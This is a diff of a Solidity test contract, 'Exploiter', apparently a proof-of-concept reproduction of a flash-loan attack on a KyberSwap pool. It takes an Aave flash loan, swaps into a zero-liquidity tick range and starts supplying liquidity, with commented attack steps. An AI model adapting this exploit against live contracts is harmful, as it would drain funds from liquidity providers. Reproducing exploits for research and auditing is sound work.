@@ -68,10 +68,8 @@ contract Exploiter is Test {
     }
 
     // entry point ////////////////////////////////////////////////////////////
-    function trigger() public returns (bool) {
+    function trigger() public {
         IAavePool(_lender).flashLoanSimple(address(this), _token1, _amount, "", 0);
-
-        return true;
     }
 
     // core ///////////////////////////////////////////////////////////////////
@@ -82,14 +80,15 @@ contract Exploiter is Test {
         uint160 __sqrtP;
         uint256 __token_id;
 
+        // settings
+        __swap_fee = IKyberswapPool(_victim).swapFeeUnits(); // 10
+
         // approval is required to mint the position
         IERC20(_token0).approve(_manager, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
         IERC20(_token1).approve(_manager, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
 
         // step 1: move to a tick range with 0 liquidity
         IKyberswapPool(_victim).swap(_attacker, int256(_amount), false, 0x100000000000000000000000000, "");
-
-        __swap_fee = IKyberswapPool(_victim).swapFeeUnits(); // 10
         
         // step 2: supply liquidity
         (__sqrtP, __currentTick, __nearestCurrentTick,) = IKyberswapPool(_victim).getPoolState();
